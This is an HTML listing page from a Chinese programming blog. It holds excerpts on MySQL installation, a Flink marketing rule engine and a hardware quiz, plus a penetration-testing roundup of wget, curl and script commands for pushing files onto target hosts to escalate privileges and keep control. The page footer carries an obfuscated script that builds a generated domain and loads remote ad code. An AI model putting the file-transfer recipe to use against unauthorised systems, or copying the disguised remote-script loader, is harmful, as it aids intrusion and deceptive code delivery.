	<div class="content list__excerpt post__content clearfix">
		Processon思维导图、画板、流程图、架构图、时序图 模板超多。。。
邀好友，免费扩容ProcessOn是一个在线协作绘图平台，支持在线制作思维导图、流程图、组织结构图、网络拓扑图、鱼骨图、UML图等，同时可实现人与人之间的实时协作和共享，提升团队工作效率。https://www.processon.com/i/5b100cd0e4b06350d44a08ac
Processon思维导图、画板、流程图、架构图、时序图 模板超多。。。
邀好友，免费扩容​www.processon.com/i/5b100cd0e4b06350d44a08ac正在上传…重新上传取消
ProcessOn是一个在线协作绘图平台,支持在线制作思维导图、流程图、组织结构图、网络拓扑图、鱼骨图、UML图等,同时可实现人与人之间的实时协作和共享,提升团队工作效率。
团队成员共创，打造团队知识地图，实现数字化资产沉淀，让团队协作更高效、数据更安全。
ProcessOn 是一个面向垂直专业领域的作图工具和社交网络，成立于2011年6月并于2012年启动。
支持绘制思维导图、流程图、UML、网络拓扑图、组织结构图、原型图、时间轴等等。 [1]
ProcessOn 将全球的专家顾问、咨询机构、BPM厂商、IT解决方案厂商和广泛的企业用户紧密地连接在一起，提供基于云服务的免费流程梳理、创作协作工具。用户可与同事和客户协同设计，实时创建和编辑文件，并可以实现更改的及时合并与同步。这意味着跨部门的流程梳理、优化和确认可以即刻完成。
专注于为作图人员提供价值，利用互联网和社交技术颠覆了人们梳理流程的方法习惯，继而使商业用户获得比传统模式更高的效率和回报，改善人们对流程图的创作过程。
免费注册：
邀好友，免费扩容​www.processon.com/i/5b100cd0e4b06350d44a08ac正在上传…重新上传取消
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b941cd39da0776992262fdc6d44fd075/" rel="bookmark">
			命令行/终端下载指令大全（Win &#43; Linux）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介
在我们渗透测试的过程中，通常会需要向目标主机传送一些文件，来达到提权，维持控制等目的。因此当不方便进行直接传输时，同时目标主机是能有网络连接的，那么此时就可以通过本地下载这种方法来达到文件传输的目的。此篇文章，我会对互联网上针对win与linux大部分的下载指令来做一个汇总，可能会有疏漏，但汇总的都是经常会用的。
Linux
2.1 Wget
这款工具功能很丰富，可以充当某种功能完备的GUI下载管理器，它拥有一款理想的下载管理器所需要的所有功能，比如它可以恢复下载，可以下载多个文件，出现某个连接问题后，可以重新尝试下载，你甚至可以管理最大的下载带宽。
直接下载：
wget http://www.sample-videos.com/video/mp4/big.mp4
后台下载:
wget -b http://www.sample-videos.com/video/mp4/big.mp4
如果互联网连接出现中断，恢复下载：
wget -c http://www.sample-videos.com/video/mp4/big.mp4
从某个密码保护的ftp软件库下载文件：
wget --ftp-user=&lt;user_name&gt; --ftp-password=&lt;Give_password&gt; Download-url-address
2.2 Curl
Curl是另一种高效的下载工具，它可以用来上传或下载文件，只要使用一个简单的命令。它支持暂停和恢复下载程序包，并支持数量最多的Web协议，可预测下载完成还剩余多少时间，可通过进度条来显示下载进度。它是所有Linux发行版的内置工具。
直接下载：
curl -o um.mp4 http://www.sample-videos.com/video/mp4/big.mp4
借助-o选项，提供名称，下载文件会以该名称保存；如使用-O选项，文件就会以原始名称保存。
2.3 Axel
这是wget的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路http连接，可下载独立文件片段，因而文件下载起来更快速。
apt-get install axel
直接下载：
axel http://www.sample-videos.com/video/mp4/big.mp4
2.4 Aria2
这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。
apt-get install aria2
直接下载：
aria2c http://www.sample-videos.com/video/mp4/big.mp4
2.5 Perl
Perl是一门很吊的语言，使用它基本可以实现任何事情，用它实现文件下载也很简单。
#!perl
#!/usr/bin/perl
use LWP::Simple;
getstore(“http://domain/file”, “file”);
执行脚本文件是这样:
perl test.pl
2.6 Python
Python也是很受欢迎的主流脚本语言，代码清晰且简洁:
#!python
#!/usr/bin/python
import urllib2
u = urllib2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b941cd39da0776992262fdc6d44fd075/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/751bd8be805731a4e7a68aaf816077c1/" rel="bookmark">
			Centos7安装Mysql8教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、yum方式安装 1.由于centOS7中默认安装了MariaDB,需要先进行卸载
rpm -qa | grep -i mariadb
rpm -e --nodeps mariadb-libs-5.5.64-1.el7.x86_64
新增：经实践在使用yum方式安装MySQL时不用卸载也可以，会被自动替代 通过rpm方式安装需要卸载，否则会出现依赖问题
查询下本机mysql是否卸载干净
rpm -qa | grep mysql
若有残留也需要卸载
2.下载MySQL仓库并安装
wget https://repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm
yum -y install mysql80-community-release-el7-3.noarch.rpm
2022年5月2日更新：
安装过程中可能遇到如下报错无法安装，原因是Mysql的GPG升级了，需要重新获取
执行以下命令再安装即可
rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022
3.默认安装MySQL8.0，如果需要安装MySQL5.7的话需要修改/etc/yum.repos.d/mysql-community.repo配置文件
将mysql80中enabled属性改为0，并添加图中红框内代码(安装MySQL8.0跳过该步骤)
4.安装MySQL数据库
yum -y install mysql-community-server
5.开启mysql服务
systemctl start mysqld.service
6.查看mysql默认密码并登陆
cat /var/log/mysqld.log | grep password
mysql -uroot -p
二、rpm方式安装 首先去官网下载完整rpm包
下载mysql5.7的话点击这里跳转至下载页面
解压tar包
依次安装所需要的rpm包即可
rpm -ivh mysql-community-common-8.0.23-1.el7.x86_64.rpm rpm -ivh mysql-community-libs-8.0.23-1.el7.x86_64.rpm --force --nodeps rpm -ivh mysql-community-libs-compat-8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/751bd8be805731a4e7a68aaf816077c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b919f1b4fb03e2eb1f0ad1acbd240acf/" rel="bookmark">
			基于flink与groovy实现全实时动态规则智能营销与风控系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：本文是对视频课程《基于flink与groovy实现亿用户级实时动态规则智能运营系统》的介绍说明；
本项目极具行业实用价值，可为各企业开发人员提供系统设计思路与灵感，而且，它不光可用于智能运营，也可以应用在实时规则推荐，实时广告推送，实时规则封控，实时交通监控等纪委广泛的场景中；
当然，各类培训机构学员也可以通过学习此项目来丰富自己的就业简历，绝对杀手锏级别！在面试中运用得当，可以起到一锤定音立竿见影的绝杀效果！
如果需要学习本项目，可联系博主
1 项目背景 传统的“精准营销平台”由营销人员基于画像标签数据去圈选人群，进行营销推送，存在不足；
这种传统手段，往往无法抓住那些 “转瞬即逝的营销机会”；
如：一个促销热爱型用户，正在浏览包包时，及时推送出正在做促销活动的包包信息，是最有效的；如：一个价格敏感型用户，正在犹豫不决反复查看他购物车中的某目标商品时，适时推送优惠券，是最有效的； 这些场景，显然无法通过营销人员通过人工手段去发现，需要用软件系统自动、实时监控用户的行为，并实时做出判断，并进而驱动营销推送系统推送相关营销内容；
总之，在应对这一类的需求时，以前的传统的“精准营销平台”显得力不从心；
因而，擅长用键鼠改变世界的攻城狮们，决定为公司的推广、运营部门开发一个应对上述场景的自动化、智能的、实时、规则动态可变的营销利器 —— 《实时智能运营系统》
2 需求分析 2.1 营销规则举例 搜索兴趣词包含“商务休闲”的用户，如果浏览包含“商务休闲”的商品页面，则触发一个优惠券推送消息；活跃度等级为C的用户，且在规则发布前的3天内，发生过 “搜索雀巢” AND “加购” ，当他再次上线时，触发一个app弹窗消息；活跃度等级为C的用户，规则发布前2天内，发生过A事件3次以上，规则上线后发生了B事件，且之后间隔1天再次发生B事件，则触发；规则运行时，检测到用户发生了下单事件，而在随后的15分钟内没有支付，则触发；规则运行时，一个用户如果搜索的关键词符合某正则表达式，则触发；宝妈用户，在2022-08-07开始，做过A行为3+次，做过（B行为，E行为）序列2+次，则触发； 2.2 规则营销需求的宏观抽象 营销规则有多样化的灵活的定义（不光参数可以支持自定义，且运算模型也可以自定义）；营销规则通常针对满足某画像的人群，也可没有针对性营销规则通常都有有效期（也有可能是无限期的），要求系统能够支持动态增加、停用运营计划（规则）营销规则根据需求的变化，需要能够方便地进行在线管理，如新增、停用、修改 2.3 营销规则受众条件的逻辑要素抽象分析 各类营销规则，都支持对目标人群的圈选
圈选的手段之一是：是对用户的画像标签数据进行定义、判断
圈选的手段之二是：对用户的行为数据进行自定义即时计算（广义上就是实时用户画像）
而行为数据即时计算的时间跨度，通常是有时间窗口约束的，而所涉及的时间跨度可能有：
只包含规则上线之前
只包含规则上线之后
横跨规则上线前到上线后
受众圈选行为画像即时条件中，抽象出来的判断要素主要有
事件类型及属性是否满足规则（如搜索事件且搜索词是否满足正则、是否包含指定关键字等）事件序列是否满足规则（是否依次发生过A-C-E序列）事件或事件序列的发生次数是否满足（如X事件是否发生了N次）事件的属性统计值是否满足（如X事件中的sum(属性amt) &gt; 100 ，事件X的行为总时长&gt;20）事件与事件之间的对比关系，如时间间隔（如：A-B事件的间隔&gt;N）、属性值（统计）对比 最后，就是上述各类条件的逻辑组合： 与 、或 、 非、 大于、 小于、 等于……
条件1： A发生次数 &gt;3条件2 ： A事件的max(amt) - A事件的min(amt） &gt; 200条件3 ： A - B间隔&gt; 5min
最终规则： 条件1 与 （条件2 或 条件3）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b919f1b4fb03e2eb1f0ad1acbd240acf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9687f20c10b94e173068a6ed29e7f34f/" rel="bookmark">
			计算机组成原理基础练习题（附解析，考前必备）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.现代计算机由CPU、I/O设备及（ A ）组成。
A.主存储器 B.主机 C.硬盘 D.外部设备
解析：计算机硬件包括：输入设备、输出设备、存储器、运算器、控制器。其中运算器和控制器组成CPU，CPU和主存储器组成主机，I/O设备也称为外设，由主机以外的其它设备组成。
2.下列不属于输入设备的是（ D ）。
A.键盘 B.扫描仪 C.鼠标 D.显示器
解析:显示器属于输出设备
3.
计算机存储数据的最小单位是（ C ）。
A.字 B.字节 C.位 D.以上都不对
解析：计算机存储数据的最小单位是位，存储的基本单位是字节
4.计算机系统中的存储系统是指（ A ）。
A.主存和辅存 B.RAM存储器 C.ROM存储器 D.主存
5.随着硬件技术的发展，计算机的电子器件推陈出新，各种类型和用途的计算机也是琳琅满目，但所有种类计算机依然具有“存储程序”的特点，最早提出这种概念的是（ A ）。 10分
A.冯·诺依曼（Von Neumann） B.图灵（Alan Mathison Turing）C.贝尔（Bell）D.巴贝（Charles Babbage）
6.计算机的运算速度与许多因素有关，如机器的主频、执行什么样的操作等。MIPS是衡量计算机运行速度普遍采用的计量单位。假想，机器A每秒能执行200万条指令，记做2MIPS，机器B每秒能执行500万条指令，记做5MIPS。在这两台机器上，运行同一程序时，两条机器上所用时间（ A ）。
A.无法确定 B.A机器用的时间短 C.A机器B机器所用时间相同 D.B机器用的时间短
解析：不同的机器翻译同一程序出来的指令数也不一样，因此无法只用MIPS来评判计算机的运行速度。一个用户程序执行过程中可能会插入运行其他程序，所以通常观测到的用户程序执行时间要大于其真正的CPU执行时间。
7.以下语言中哪一种在计算机上执行最快(B)？ A.Java B.汇编语言 C.C++ D.Python
解析：汇编语言属于低级语言，其他的属于高级语言，语言级别越低运行越快
8.对于32位的计算机，一个字节由（ D ）位组成。
A.64 B.16 C.32 D.8
解析：一个字节由8位二进制位组成，和计算机的机器字长没有关系。在32位计算机中，一个字长为32位，一个字节为8位，所以从长度来说，一个字长为4字节。 字长概要：在同一时间处理二进制数的位数称为字长。 通常，处理字长为8位的数据的CPU称为8位CPU，32位CPU同时处理字长为32位的二进制数据。
9.用一个时钟频率为40MHz的处理器执行标准测试程序，它所包含的混合指令数和响应所需的时钟周期见下表所示。试求出有效的CPI、MIPS速率和程序的执行时间（假设有N条指令）。
CPI = 1 * 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9687f20c10b94e173068a6ed29e7f34f/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/230/">«</a>
	<span class="pagination__item pagination__item--current">231/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/232/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>